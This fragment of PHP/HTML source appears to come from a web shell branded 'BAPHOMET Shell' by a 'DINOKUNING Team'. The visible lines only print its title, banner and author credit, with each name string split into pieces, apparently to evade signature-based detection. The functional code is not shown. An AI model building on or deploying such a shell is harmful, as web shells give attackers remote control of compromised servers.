...
<html>
<head>
	<?php echo "<title>BA"."PH"."OMET Sh"."el"."l</title>"; ?>
...
<center>
<?php
echo '<font face="Bungee" size="5">BA'.'PH'.'OMET'.' Sh'.'el'.'l</font></center>
...
function author() {
	echo "<center><br>BA"."PH"."OMET - 2"."02"."3<br>DI"."NO"."KUNING"." Te"."am</center>";
	exit();
}
